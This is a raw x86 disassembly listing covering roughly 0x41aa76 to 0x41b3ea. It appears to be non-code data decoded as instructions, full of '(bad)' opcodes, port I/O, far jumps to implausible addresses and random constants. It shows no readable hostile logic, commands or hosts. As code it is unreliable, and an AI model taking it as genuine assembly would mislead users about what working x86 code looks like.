  41aa76:	cmp    edx,ecx
  41aa78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa79:	aad    0xa9
  41aa7b:	cmp    esi,DWORD PTR [edx+ecx*2-0x6d]
  41aa7f:	aad    0xf0
  41aa81:	imul   esp,DWORD PTR [edi+0x28],0x54
  41aa85:	es add al,0x78
  41aa88:	icebp  
  41aa89:	sbb    BYTE PTR [ecx],cl
  41aa8b:	jo     0x41aaf7
  41aa8d:	jmp    0x41aa20
  41aa8f:	inc    ebx
  41aa90:	cmp    eax,0x85d098a3
  41aa95:	sbb    DWORD PTR [edi-0x62],ebx
  41aa98:	xchg   ecx,eax
  41aa99:	lods   al,BYTE PTR ds:[esi]
  41aa9a:	pop    edi
  41aa9b:	in     al,dx
  41aa9c:	dec    ecx
  41aa9d:	ja     0x41aa5b
  41aa9f:	dec    ecx
  41aaa0:	in     al,dx
  41aaa1:	retf   
  41aaa2:	fs or  al,0x5
  41aaa5:	in     al,0xd9
  41aaa7:	pop    eax
  41aaa8:	mov    cl,0x85
  41aaaa:	js     0x41ab1c
  41aaac:	jne    0x41aab7
  41aaae:	pop    esi
  41aaaf:	xchg   ebp,eax
  41aab0:	jmp    0x215c9236
  41aab5:	shr    DWORD PTR [ecx+0x23428d92],1
  41aabb:	fidiv  DWORD PTR [edx-0x21]
  41aabe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aabf:	loope  0x41ab39
  41aac1:	into   
  41aac2:	nop
  41aac3:	add    BYTE PTR [edx],ch
  41aac5:	into   
  41aac6:	pop    ebx
  41aac7:	and    DWORD PTR [esi-0x6d8749de],ebp
  41aacd:	sbb    dh,dl
  41aacf:	aas    
  41aad0:	sbb    al,0x2c
  41aad2:	add    BYTE PTR [edx-0x9d2299f],dl
  41aad8:	xor    BYTE PTR [ebp-0x8],dh
  41aadb:	sbb    DWORD PTR [ecx+0x3684d056],ecx
  41aae1:	xchg   ebx,eax
  41aae2:	inc    esp
  41aae3:	stos   DWORD PTR es:[edi],eax
  41aae4:	or     DWORD PTR [ecx+0x5bf679d9],esi
  41aaea:	loop   0x41aaae
  41aaec:	out    dx,al
  41aaed:	or     al,0x0
	...
  41ab53:	add    BYTE PTR [eax],al
  41ab55:	add    bh,dh
  41ab57:	add    esp,ebx
  41ab59:	mov    ah,0xfe
  41ab5b:	std    
  41ab5c:	inc    DWORD PTR [ebx+0x5f]
  41ab5f:	sbb    BYTE PTR [esi+0x43],ah
  41ab62:	ins    DWORD PTR es:[edi],dx
  41ab63:	mov    bl,0x3
  41ab65:	jge    0x41abce
  41ab67:	pop    ds
  41ab68:	add    DWORD PTR [eax],eax
  41ab6a:	add    BYTE PTR [ecx],al
  41ab6c:	add    BYTE PTR [eax],al
  41ab6e:	mov    dl,0xbe
  41ab70:	imul   ebp
  41ab72:	fs xor eax,0xf4eed45c
  41ab78:	sbb    al,0x3f
  41ab7a:	pop    eax
  41ab7b:	xchg   edx,eax
  41ab7c:	loope  0x41abce
  41ab7e:	aaa    
  41ab7f:	scas   al,BYTE PTR es:[edi]
  41ab80:	hlt    
  41ab81:	dec    ecx
  41ab82:	outs   dx,BYTE PTR ds:[esi]
  41ab83:	jbe    0x41ab23
  41ab85:	scas   al,BYTE PTR es:[edi]
  41ab86:	xchg   ebx,eax
  41ab87:	sbb    eax,0x1d8371cd
  41ab8c:	dec    esi
  41ab8d:	dec    ecx
  41ab8e:	in     al,dx
  41ab8f:	call   0xb3463731
  41ab94:	push   eax
  41ab95:	out    dx,eax
  41ab96:	mov    ch,0x42
  41ab98:	jmp    0x6fc391a1
  41ab9d:	cli    
  41ab9e:	lods   al,BYTE PTR ds:[esi]
  41ab9f:	and    dh,ch
  41aba1:	add    edx,DWORD PTR [ebp+eiz*2+0x3c]
  41aba5:	arpl   WORD PTR [ebx],bx
  41aba7:	es mov bh,0xcf
  41abaa:	pmulhw mm5,QWORD PTR [esi]
  41abad:	push   ebp
  41abae:	les    ebx,FWORD PTR [eax-0x59]
  41abb1:	inc    ebp
  41abb2:	mov    BYTE PTR [edi+0x56201523],dh
  41abb8:	mov    ecx,edx
  41abba:	cwde   
  41abbb:	stos   DWORD PTR es:[edi],eax
  41abbc:	jge    0x41ab86
  41abbe:	jp     0x41abb4
  41abc0:	test   al,0x12
  41abc2:	rol    ecx,1
  41abc4:	adc    ebx,DWORD PTR [eax+0x67]
  41abc7:	mov    ds:0xf506252e,eax
  41abcc:	pop    ecx
  41abcd:	mov    dl,0xc0
  41abcf:	mov    ds:0x45c2a21,eax
  41abd4:	push   ecx
  41abd5:	aad    0xab
  41abd7:	call   0x73fbda5f
  41abdc:	les    ecx,FWORD PTR [ebx]
  41abde:	cld    
  41abdf:	xchg   edi,eax
  41abe0:	and    cl,BYTE PTR [ecx+0x45666b10]
  41abe6:	add    ebp,edi
  41abe8:	scas   eax,DWORD PTR es:[edi]
  41abe9:	sbb    eax,0x5b8be192
  41abee:	lea    ebx,[ebx+0x3c1adfa8]
  41abf4:	or     eax,0x6d9ed229
  41abf9:	xchg   ebp,eax
  41abfa:	sbb    esp,DWORD PTR [eax+0x144ddad2]
  41ac00:	lds    ecx,FWORD PTR [eax-0x41dd1552]
  41ac06:	push   0xdbec30f9
  41ac0b:	(bad)  
  41ac0d:	xchg   edx,ecx
  41ac0f:	popa   
  41ac10:	push   cs
  41ac11:	sub    ah,dl
  41ac13:	cmc    
  41ac14:	jmp    0x41ab9e
  41ac16:	retf   0xb9f0
  41ac19:	ret    
  41ac1a:	loop   0x41ac86
  41ac1c:	into   
  41ac1d:	xor    eax,0x3f687d6
  41ac22:	xchg   edx,eax
  41ac23:	add    cl,BYTE PTR [eax+0x54fdf447]
  41ac29:	scas   eax,DWORD PTR es:[edi]
  41ac2a:	mov    bl,bh
  41ac2c:	and    BYTE PTR [edx+0x33],dl
  41ac2f:	jne    0x41ac4d
  41ac31:	nop
  41ac32:	ror    BYTE PTR [ebp-0x6e],0x31
  41ac36:	mov    ch,bh
  41ac38:	pop    ds
  41ac39:	gs (bad) 
  41ac3b:	adc    bl,BYTE PTR [eax-0x3d]
  41ac3e:	cmc    
  41ac3f:	fisubr WORD PTR [eax+0x1c5fd17c]
  41ac45:	sbb    ebx,DWORD PTR [ebx+0x78d0de23]
  41ac4b:	lahf   
  41ac4c:	les    ecx,FWORD PTR [edi]
  41ac4e:	xor    BYTE PTR [ebx+0x74],al
  41ac51:	xor    al,0xee
  41ac53:	add    al,0x2f
  41ac55:	mov    cl,0x5c
  41ac57:	aam    0x8a
  41ac59:	mov    ds:0x33694a2a,al
  41ac5e:	mov    ebp,0x620d2fbb
  41ac63:	je     0x41acd3
  41ac65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac66:	mov    es,WORD PTR ds:0x7290ab93
  41ac6c:	xlat   BYTE PTR ds:[ebx]
  41ac6d:	xchg   DWORD PTR [eax],eax
	...
  41acd3:	add    BYTE PTR [eax],al
  41acd5:	add    BYTE PTR [edx+0x49],ch
  41acd8:	es cmp al,0x27
  41acdb:	jg     0x41ad57
  41acdd:	pop    edi
  41acde:	or     al,0x44
  41ace0:	xor    ah,BYTE PTR [ebx+ebx*1+0x77]
  41ace4:	mov    ds:0x12067e5,eax
  41ace9:	add    BYTE PTR [eax],al
  41aceb:	add    DWORD PTR [eax],eax
  41aced:	add    BYTE PTR [ebx+0xf],dl
  41acf0:	inc    ecx
  41acf1:	sbb    eax,0xb09b2f6d
  41acf6:	push   es
  41acf7:	int3   
  41acf8:	or     al,0x2f
  41acfa:	call   0x5615:0x47d67372
  41ad01:	ret    0xfcea
  41ad04:	js     0x41ad35
  41ad06:	int3   
  41ad07:	mov    bl,0x6a
  41ad09:	cld    
  41ad0a:	dec    ecx
  41ad0b:	xor    ebp,eax
  41ad0d:	ins    BYTE PTR es:[edi],dx
  41ad0e:	add    DWORD PTR [ecx],0x51
  41ad11:	jecxz  0x41ad06
  41ad13:	mov    ebx,0xba7372a3
  41ad18:	(bad)  
  41ad19:	sbb    esi,ebx
  41ad1b:	nop
  41ad1c:	les    esp,FWORD PTR [ebp+ecx*8-0x32]
  41ad20:	ret    0x8780
  41ad23:	int    0xe
  41ad25:	pop    ebp
  41ad26:	lea    esi,[edi]
  41ad28:	mov    ah,0xc7
  41ad2a:	adc    dl,BYTE PTR [eax+0xb]
  41ad2d:	in     al,dx
  41ad2e:	push   ecx
  41ad2f:	out    dx,eax
  41ad30:	adc    BYTE PTR [ecx],0x95
  41ad33:	(bad)  
  41ad35:	and    DWORD PTR [edi-0x52],ecx
  41ad38:	fiadd  WORD PTR ds:0x2c497a24
  41ad3e:	xchg   edi,eax
  41ad3f:	lock xchg edx,eax
  41ad41:	and    edi,DWORD PTR [esi]
  41ad43:	mov    ds:0xf15ffd73,eax
  41ad48:	lea    esp,[ecx+0x1a]
  41ad4b:	popf   
  41ad4c:	sbb    dl,cl
  41ad4e:	clc    
  41ad4f:	pop    edi
  41ad50:	mov    edi,0xcb8eade8
  41ad55:	add    BYTE PTR [esi-0x1d6a0c56],ah
  41ad5b:	adc    BYTE PTR [ebx],dl
  41ad5d:	xchg   esp,eax
  41ad5e:	xor    ebp,DWORD PTR [edx-0x3f]
  41ad61:	lock (bad) 
  41ad63:	mov    ebx,0xb26198ca
  41ad68:	repnz push ebp
  41ad6a:	stos   BYTE PTR es:[edi],al
  41ad6b:	pushf  
  41ad6c:	hlt    
  41ad6d:	fidivr DWORD PTR [esi+0x2e]
  41ad70:	push   ss
  41ad71:	ins    DWORD PTR es:[edi],dx
  41ad72:	fsubr  st(2),st
  41ad74:	sub    bh,dh
  41ad76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad77:	mov    eax,0x5e7c4685
  41ad7c:	lods   eax,DWORD PTR ds:[esi]
  41ad7d:	(bad)  
  41ad7e:	pop    ecx
  41ad7f:	push   esi
  41ad80:	pop    es
  41ad81:	xchg   DWORD PTR [eax+ecx*4],ebp
  41ad84:	shr    BYTE PTR [edx-0x62],cl
  41ad87:	xchg   edi,eax
  41ad88:	mov    edi,DWORD PTR [ecx-0x524c7ce4]
  41ad8e:	dec    ebp
  41ad8f:	cdq    
  41ad90:	in     eax,0xa
  41ad92:	cmp    BYTE PTR [eax],al
  41ad94:	sub    ebp,esp
  41ad96:	or     DWORD PTR [esi-0x637b9578],0x72
  41ad9d:	jae    0x41ada6
  41ad9f:	inc    edx
  41ada0:	and    BYTE PTR [edx-0x5],ah
  41ada3:	mov    al,0x1f
  41ada5:	cmp    eax,0x3115523
  41adaa:	shr    DWORD PTR [edx],0xbb
  41adad:	jne    0x41ad2f
  41adaf:	scas   al,BYTE PTR es:[edi]
  41adb0:	sbb    dl,BYTE PTR ds:0x819de9e3
  41adb6:	sbb    al,0xce
  41adb8:	xchg   BYTE PTR [ebx-0x5d31d032],cl
  41adbe:	xchg   BYTE PTR [eax+0x74],bh
  41adc1:	popf   
  41adc2:	nop
  41adc3:	inc    ecx
  41adc4:	jmp    0xc6be75b0
  41adc9:	lahf   
  41adca:	ja     0x41ad90
  41adcc:	ja     0x41adfc
  41adce:	cmp    bh,0x7c
  41add1:	stos   BYTE PTR es:[edi],al
  41add2:	mov    edx,0x5fe4d848
  41add7:	ins    BYTE PTR es:[edi],dx
  41add8:	(bad)  
  41add9:	jae    0x41ae41
  41addb:	mov    ds:0xf95f921a,eax
  41ade0:	fs cdq 
  41ade2:	or     al,BYTE PTR [ecx-0x4e]
  41ade5:	inc    ecx
  41ade6:	in     eax,dx
  41ade7:	enter  0x5933,0x1a
  41adeb:	test   al,0xd0
  41aded:	add    al,BYTE PTR [eax]
	...
  41ae53:	add    BYTE PTR [eax],al
  41ae55:	add    BYTE PTR [ebp-0x8],dl
  41ae58:	or     DWORD PTR [esi-0x4280053],ebx
  41ae5e:	dec    edi
  41ae5f:	push   eax
  41ae60:	cmp    DWORD PTR [edx+edi*4+0x671b99f9],esp
  41ae67:	and    DWORD PTR [ecx],eax
  41ae69:	add    BYTE PTR [eax],al
  41ae6b:	add    DWORD PTR [eax],eax
  41ae6d:	add    BYTE PTR [ecx],cl
  41ae6f:	push   edx
  41ae70:	jns    0x41aea4
  41ae72:	inc    ebx
  41ae73:	lds    esi,FWORD PTR [eax-0x60325ffb]
  41ae79:	outs   dx,BYTE PTR ds:[esi]
  41ae7a:	xchg   ecx,eax
  41ae7b:	mov    bl,0xa9
  41ae7d:	adc    esp,DWORD PTR [edi+0x4a]
  41ae80:	push   ebp
  41ae81:	jecxz  0x41aee6
  41ae83:	sbb    eax,0x83beb7d8
  41ae88:	stos   DWORD PTR es:[edi],eax
  41ae89:	push   es
  41ae8a:	adc    eax,0xe0b996de
  41ae8f:	ficom  DWORD PTR [edx-0x49]
  41ae92:	rcl    BYTE PTR [edx],1
  41ae94:	ds fs out dx,al
  41ae97:	daa    
  41ae98:	out    dx,eax
  41ae99:	add    ebx,ebx
  41ae9b:	loopne 0x41ae4a
  41ae9d:	push   edi
  41ae9e:	retf   0xb7f6
  41aea1:	sar    edi,0xee
  41aea4:	lock fisttp WORD PTR [ecx+0x168d8be5]
  41aeab:	mov    esp,0x292abdab
  41aeb0:	pop    ds
  41aeb1:	(bad)  
  41aeb2:	sbb    cl,BYTE PTR [eax]
  41aeb4:	cmp    BYTE PTR [ecx+0x22],bl
  41aeb7:	out    0x70,eax
  41aeb9:	in     eax,dx
  41aeba:	(bad)  
  41aebb:	loop   0x41aef0
  41aebd:	cs push 0xca09814c
  41aec3:	jl     0x41aee7
  41aec5:	pop    eax
  41aec6:	rcl    BYTE PTR [eax-0x9],1
  41aec9:	add    DWORD PTR [bx-0x6d],ecx
  41aecd:	jae    0x41aec5
  41aecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aed0:	jbe    0x41aebe
  41aed2:	xor    BYTE PTR [eax+0x30],al
  41aed5:	add    al,0x41
  41aed7:	std    
  41aed8:	repz cmp edx,DWORD PTR [ebp+esi*2+0x5a9fd470]
  41aee0:	or     BYTE PTR [edi+0x61],0x16
  41aee4:	lods   al,BYTE PTR ds:[esi]
  41aee5:	outs   dx,BYTE PTR ds:[esi]
  41aee6:	popa   
  41aee7:	mov    dh,0x28
  41aee9:	cdq    
  41aeea:	hlt    
  41aeeb:	pop    ebp
  41aeec:	out    dx,eax
  41aeed:	lock dec esi
  41aeef:	(bad)  
  41aef0:	not    DWORD PTR [edx+0x23]
  41aef3:	std    
  41aef4:	pop    ebx
  41aef5:	and    edx,DWORD PTR [eax+edi*2]
  41aef8:	xchg   ebx,eax
  41aef9:	or     DWORD PTR [esi],ebx
  41aefb:	xchg   esi,eax
  41aefc:	js     0x41af34
  41aefe:	fs mov esp,0xe33c8b1a
  41af04:	adc    eax,0xce7bc0d2
  41af09:	mov    ds:0x6f6880a2,al
  41af0e:	rcl    ebp,cl
  41af10:	adc    al,0x8c
  41af12:	not    BYTE PTR [edx]
  41af14:	das    
  41af15:	popf   
  41af16:	cdq    
  41af17:	dec    ebx
  41af18:	mov    al,ds:0x90f9feab
  41af1d:	inc    DWORD PTR [edx]
  41af1f:	mov    dh,0x53
  41af21:	or     eax,0x15eedc70
  41af26:	push   ebp
  41af27:	and    dl,ah
  41af29:	ficom  DWORD PTR [ebp-0x2e01727f]
  41af2f:	into   
  41af30:	scas   al,BYTE PTR es:[edi]
  41af31:	pop    edx
  41af32:	ret    0x2ba7
  41af35:	sub    bl,dh
  41af37:	pop    ss
  41af38:	xchg   ebx,eax
  41af3a:	xchg   edx,eax
  41af3b:	dec    ebp
  41af3c:	xchg   esp,eax
  41af3d:	push   ebx
  41af3e:	jnp    0x41af0c
  41af40:	dec    ebx
  41af41:	mov    dh,0x19
  41af43:	mov    ecx,0x573d50fc
  41af48:	out    dx,eax
  41af49:	push   ebx
  41af4a:	ins    DWORD PTR es:[edi],dx
  41af4b:	pop    edi
  41af4c:	add    eax,0x9c9c96ac
  41af51:	mov    ds:0xc52b10f2,al
  41af56:	cli    
  41af57:	pop    ss
  41af58:	inc    edx
  41af59:	aam    0x5e
  41af5b:	jg     0x41af6c
  41af5d:	fwait
  41af5e:	jl     0x41af84
  41af60:	in     al,0xa5
  41af62:	scas   al,BYTE PTR es:[edi]
  41af63:	xchg   edx,eax
  41af64:	repnz enter 0x9a32,0x86
  41af69:	sub    eax,0x72f54895
	...
  41afd6:	(bad)  
  41afd9:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41afdf:	mov    ecx,0x3dc44ee
  41afe4:	pop    es
  41afe5:	mov    fs,WORD PTR [edi+0x22]
  41afe8:	add    DWORD PTR [eax],eax
  41afea:	add    BYTE PTR [ecx],al
  41afec:	add    BYTE PTR [eax],al
  41afee:	loopne 0x41afbe
  41aff0:	jecxz  0x41b051
  41aff2:	inc    ecx
  41aff3:	mov    eax,0xd765d198
  41aff8:	rcr    DWORD PTR [edi-0x621cb472],cl
  41affe:	aam    0xb7
  41b000:	arpl   di,bp
  41b002:	sbb    cl,BYTE PTR gs:[esp+eax*1-0x7c71ce4a]
  41b00a:	retf   0x754f
  41b00d:	pop    esp
  41b00e:	and    eax,0x73e09924
  41b013:	dec    edi
  41b014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b015:	les    edi,FWORD PTR [eax+0x740fbeb8]
  41b01b:	mov    eax,ds:0xf5f81288
  41b020:	stos   BYTE PTR es:[edi],al
  41b021:	push   edi
  41b022:	pop    ecx
  41b023:	xor    eax,0x3c5211cb
  41b028:	mov    esp,0xd1faa7a8
  41b02d:	cwde   
  41b02e:	jp     0x41afb3
  41b030:	in     al,0x4
  41b032:	cmp    al,0x31
  41b034:	xchg   esp,eax
  41b035:	add    dh,0x97
  41b038:	jecxz  0x41afef
  41b03a:	jbe    0x41b012
  41b03c:	mov    ebx,0x8927ec0b
  41b041:	nop
  41b042:	aaa    
  41b043:	mov    esi,DWORD PTR [ebp+0x1c]
  41b046:	mov    ebx,0x30a2dc36
  41b04b:	ror    BYTE PTR [ecx+0x6890aaed],0x7c
  41b052:	mov    al,0x30
  41b054:	jle    0x41b03e
  41b056:	mov    dh,0x6
  41b058:	ret    0xe1a2
  41b05b:	xor    al,0xbb
  41b05d:	sub    bl,0x6e
  41b060:	iret   
  41b061:	pop    ecx
  41b062:	or     DWORD PTR [esi*2-0x7262a34e],edi
  41b069:	into   
  41b06a:	mov    bl,0x39
  41b06c:	add    DWORD PTR [ebp-0x3869254b],ebx
  41b072:	inc    bp
  41b074:	outs   dx,DWORD PTR ds:[esi]
  41b075:	aam    0xfb
  41b077:	imul   eax,DWORD PTR [ecx-0x3],0x7c
  41b07b:	add    BYTE PTR cs:[edx-0x6196c71b],0x7
  41b083:	data16 and dl,BYTE PTR [edx]
  41b086:	rcr    DWORD PTR [ebx+0x1819ea80],0x18
  41b08d:	addr16 (bad) 
  41b08f:	push   cs
  41b090:	add    esp,DWORD PTR [eax]
  41b092:	dec    esi
  41b093:	push   ebx
  41b094:	sbb    BYTE PTR [eax],0xc2
  41b097:	xchg   edi,eax
  41b098:	mov    bh,0x6d
  41b09a:	je     0x41b024
  41b09c:	mov    ah,0xb7
  41b09e:	neg    BYTE PTR [ebp+0x52]
  41b0a1:	fcomp  QWORD PTR [ebp-0x6dcc22bc]
  41b0a7:	cmp    eax,0x251958e0
  41b0ac:	out    dx,eax
  41b0ad:	jb     0x41b043
  41b0af:	bound  esi,QWORD PTR [eax-0x5e]
  41b0b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0b3:	push   eax
  41b0b4:	mov    bl,0xeb
  41b0b6:	jno    0x41b0c4
  41b0b8:	(bad)  
  41b0b9:	jmp    0x41b0f6
  41b0bb:	(bad)  
  41b0bc:	(bad)  
  41b0bd:	jle    0x41b107
  41b0bf:	add    al,0xcc
  41b0c1:	or     al,0xa7
  41b0c3:	sub    al,0xbe
  41b0c5:	inc    edx
  41b0c6:	cwde   
  41b0c7:	cli    
  41b0c8:	stc    
  41b0c9:	mov    bh,BYTE PTR [edx+0x685a3d5]
  41b0cf:	inc    esi
  41b0d0:	jmp    0x41b11b
  41b0d2:	mov    ebx,ebp
  41b0d4:	mov    edi,0xcc768cee
  41b0d9:	mov    esp,0x5f17ced0
  41b0de:	rcr    bl,0xf9
  41b0e1:	pop    es
  41b0e2:	aas    
  41b0e3:	arpl   WORD PTR [ecx+0x2c],dx
  41b0e6:	jmp    0x77e:0x511a239c
  41b0ed:	jle    0x41b0ef
	...
  41b153:	add    BYTE PTR [eax],al
  41b155:	add    dh,al
  41b157:	ficom  WORD PTR [eax]
  41b159:	stos   DWORD PTR es:[edi],eax
  41b15a:	sbb    bh,ch
  41b15c:	(bad)  
  41b15d:	call   DWORD PTR [edx+edx*8+0x75]
  41b161:	mov    edi,0x113c8bd4
  41b166:	and    eax,DWORD PTR [bx+di]
  41b169:	add    BYTE PTR [eax],al
  41b16b:	add    DWORD PTR [eax],eax
  41b16d:	add    BYTE PTR [ebx],al
  41b16f:	sub    al,BYTE PTR [esi+0x41]
  41b172:	pop    ds
  41b173:	cmp    DWORD PTR [ebx],ecx
  41b175:	das    
  41b176:	push   eax
  41b177:	out    0x41,al
  41b179:	into   
  41b17a:	sub    dl,ah
  41b17c:	ja     0x41b121
  41b17e:	and    DWORD PTR [esi-0x7d7acf8],0x60
  41b185:	adc    ah,BYTE PTR [ebx-0x70]
  41b188:	je     0x41b1bd
  41b18a:	mov    ds:0xce3dd306,eax
  41b18f:	sbb    al,0x2b
  41b191:	cmp    al,0x51
  41b193:	lahf   
  41b194:	in     eax,0x96
  41b196:	aad    0x3b
  41b198:	push   ebp
  41b199:	into   
  41b19a:	sub    al,0xeb
  41b19c:	imul   ecx
  41b19e:	add    al,0x48
  41b1a0:	push   edi
  41b1a1:	mov    al,ds:0x83334155
  41b1a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1a7:	rol    DWORD PTR [ecx+0x49b85d1e],0x1e
  41b1ae:	ins    DWORD PTR es:[edi],dx
  41b1af:	pop    esi
  41b1b0:	test   eax,0x9fae0ed7
  41b1b5:	add    BYTE PTR [edi+edi*4],dl
  41b1b8:	adc    eax,0xdd230452
  41b1bd:	je     0x41b20d
  41b1bf:	psrlw  mm6,QWORD PTR ds:0x89cc0fa7
  41b1c6:	out    dx,al
  41b1c7:	ror    BYTE PTR [esi+0x45],1
  41b1ca:	ret    0x7f01
  41b1cd:	add    edi,DWORD PTR [ebp+ebx*2-0xa]
  41b1d1:	stos   DWORD PTR es:[edi],eax
  41b1d2:	dec    ebx
  41b1d3:	dec    esp
  41b1d4:	das    
  41b1d5:	sbb    BYTE PTR [esi+ebx*4+0x10],ah
  41b1d9:	out    dx,al
  41b1da:	xor    BYTE PTR [ebp+0x65],bh
  41b1dd:	and    DWORD PTR [ebx+0x3e],ebx
  41b1e0:	daa    
  41b1e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1e2:	push   cs
  41b1e3:	into   
  41b1e4:	ss shl edi,cl
  41b1e7:	mov    dh,0xa2
  41b1e9:	dec    esi
  41b1ea:	mov    dh,0x3
  41b1ec:	call   0xe8d6:0x7c0ee14b
  41b1f3:	jns    0x41b17c
  41b1f5:	or     dl,al
  41b1f7:	test   eax,0x35bf9b49
  41b1fc:	mov    cl,0x3e
  41b1fe:	xchg   ebx,eax
  41b1ff:	mov    ebx,0x6055fb2
  41b204:	jl     0x41b187
  41b206:	out    dx,al
  41b207:	pop    es
  41b208:	sbb    eax,0x40126725
  41b20d:	aam    0x85
  41b20f:	cs fs jl 0x41b1ea
  41b213:	cmp    eax,0x5c37af16
  41b218:	jnp    0x41b251
  41b21a:	mov    al,ds:0x515bf290
  41b21f:	sar    dh,1
  41b221:	pop    esi
  41b222:	sbb    DWORD PTR [edx],edx
  41b224:	in     eax,0xfb
  41b226:	shl    BYTE PTR [edx+0xc],1
  41b229:	push   edi
  41b22a:	xor    DWORD PTR [eax],ebp
  41b22c:	shr    DWORD PTR [edx+0x29ec332f],1
  41b232:	cmp    eax,0x7927907a
  41b237:	sbb    ebp,DWORD PTR [esi+eax*8+0x3b]
  41b23b:	and    DWORD PTR [ebp+0x20],edx
  41b23e:	push   ss
  41b23f:	jg     0x41b284
  41b241:	jg     0x41b1c4
  41b243:	adc    al,0x4e
  41b245:	in     eax,0xdc
  41b247:	cmp    bl,BYTE PTR [ebx+0x1a]
  41b24a:	xor    eax,0xe0b93799
  41b24f:	jo     0x41b23b
  41b251:	outs   dx,BYTE PTR ds:[esi]
  41b252:	mov    ebp,0xfd84839b
  41b257:	imul   ah
  41b259:	aas    
  41b25a:	into   
  41b25b:	inc    esi
  41b25c:	aas    
  41b25d:	outs   dx,DWORD PTR ds:[esi]
  41b25e:	mov    dh,0x60
  41b260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b261:	pop    ecx
  41b262:	outs   dx,DWORD PTR ds:[esi]
  41b263:	or     dh,BYTE PTR [edx-0x1]
  41b266:	in     al,dx
  41b267:	mov    dl,0x92
  41b269:	jo     0x41b2b7
  41b26b:	xor    edi,eax
  41b26d:	test   al,0x0
	...
  41b2d3:	add    BYTE PTR [eax],al
  41b2d5:	add    BYTE PTR [esi+0x6be069a5],cl
  41b2db:	in     al,dx
  41b2dc:	(bad)  
  41b2dd:	out    dx,eax
  41b2de:	stos   BYTE PTR es:[edi],al
  41b2df:	jge    0x41b27c
  41b2e1:	or     BYTE PTR [edx+0x78],bh
  41b2e4:	push   0x74
  41b2e6:	addr16 and al,0x1
  41b2e9:	add    BYTE PTR [eax],al
  41b2eb:	add    DWORD PTR [eax],eax
  41b2ed:	add    bl,dh
  41b2ef:	dec    eax
  41b2f0:	mov    WORD PTR [edx-0x7820644e],es
  41b2f6:	cmp    ah,BYTE PTR [ecx+0x3]
  41b2f9:	sbb    al,0x41
  41b2fb:	sbb    bl,BYTE PTR [ecx+edi*8+0x12]
  41b2ff:	xchg   esp,eax
  41b300:	xor    DWORD PTR [eax-0x3ab7d17b],edi
  41b306:	lods   eax,DWORD PTR ds:[esi]
  41b307:	loop   0x41b32a
  41b309:	jp     0x41b2b7
  41b30b:	shl    esi,1
  41b30d:	out    0xc5,al
  41b30f:	sbb    al,0x50
  41b311:	test   eax,0x9adf8d67
  41b316:	or     al,0x1a
  41b318:	xor    BYTE PTR [edx+0x42],dh
  41b31b:	or     DWORD PTR [ebp+0x6b51e520],0xffffff82
  41b322:	pop    edx
  41b323:	(bad)  [esp+esi*4+0x6675c4dc]
  41b32a:	jmp    0xbbcaa8d7
  41b32f:	pop    es
  41b330:	xor    esp,ecx
  41b332:	scas   al,BYTE PTR es:[edi]
  41b333:	push   esp
  41b334:	pop    edi
  41b335:	cmp    ebx,DWORD PTR [edi]
  41b337:	nop
  41b338:	call   FWORD PTR [edx]
  41b33a:	or     DWORD PTR [esi+0x58],edx
  41b33d:	iret   
  41b33e:	add    cl,BYTE PTR [edi]
  41b340:	jno    0x41b36b
  41b342:	rcr    edx,cl
  41b344:	add    BYTE PTR [ebx],bh
  41b346:	sbb    al,0xc1
  41b348:	stos   DWORD PTR es:[edi],eax
  41b349:	dec    esi
  41b34a:	mov    ch,BYTE PTR [edx-0x2fa9a071]
  41b350:	jmp    0xf1f7:0xfb4a38ff
  41b357:	enter  0xe8a0,0xbd
  41b35b:	sbb    dl,BYTE PTR [edi]
  41b35d:	sub    edi,DWORD PTR [ecx+eiz*1]
  41b360:	popa   
  41b361:	push   ds
  41b362:	jecxz  0x41b37d
  41b364:	clc    
  41b365:	scas   al,BYTE PTR es:[edi]
  41b366:	mov    dl,0x62
  41b368:	mov    dh,0xb3
  41b36a:	jnp    0x41b3a0
  41b36c:	pop    edx
  41b36d:	push   ds
  41b36e:	mov    BYTE PTR [eax-0x79],al
  41b371:	mov    esi,0x2ab1db96
  41b376:	retf   
  41b377:	mov    WORD PTR ds:0x88687515,fs
  41b37d:	mov    edi,0xf23ec811
  41b382:	xchg   esi,eax
  41b383:	jae    0x41b31a
  41b385:	push   esp
  41b386:	out    dx,eax
  41b387:	inc    eax
  41b388:	mov    edi,0x1a59c6d8
  41b38d:	mov    al,ds:0x56411c34
  41b392:	xchg   edx,eax
  41b393:	scas   eax,DWORD PTR es:[edi]
  41b394:	push   esi
  41b395:	rol    BYTE PTR [ebx-0x320baca3],cl
  41b39b:	dec    ecx
  41b39c:	add    eax,0x88a8fb
  41b3a1:	loopne 0x41b414
  41b3a3:	js     0x41b3fe
  41b3a5:	xchg   edi,eax
  41b3a6:	fadd   DWORD PTR [edi]
  41b3a8:	push   esi
  41b3a9:	cli    
  41b3aa:	loope  0x41b3ed
  41b3ac:	fisttp WORD PTR [edi+0xb8fc01c]
  41b3b2:	inc    edi
  41b3b3:	rcl    BYTE PTR [esi-0x2d7beea8],cl
  41b3b9:	fisub  DWORD PTR [eax-0x1cb88214]
  41b3bf:	xor    bl,ch
  41b3c1:	xchg   ebx,eax
  41b3c2:	les    ecx,FWORD PTR [ecx+0x5de6af12]
  41b3c8:	xchg   ebp,eax
  41b3c9:	data16 sbb al,0x33
  41b3cc:	mov    cl,0x3c
  41b3ce:	ins    DWORD PTR es:[edi],dx
  41b3cf:	cmp    eax,0x3a37b035
  41b3d4:	dec    edx
  41b3d5:	cld    
  41b3d6:	int    0x14
  41b3d8:	push   ebp
  41b3d9:	cmp    al,0x42
  41b3db:	ins    DWORD PTR es:[edi],dx
  41b3dc:	xor    bl,BYTE PTR [ecx-0x7a06eee1]
  41b3e2:	jo     0x41b37f
  41b3e4:	scas   al,BYTE PTR es:[edi]
  41b3e5:	mov    ah,0x3e
  41b3e7:	(bad)  
  41b3e8:	aad    0xa7
  41b3ea:	rol    BYTE PTR [esi+0xd51c],0x0
	...
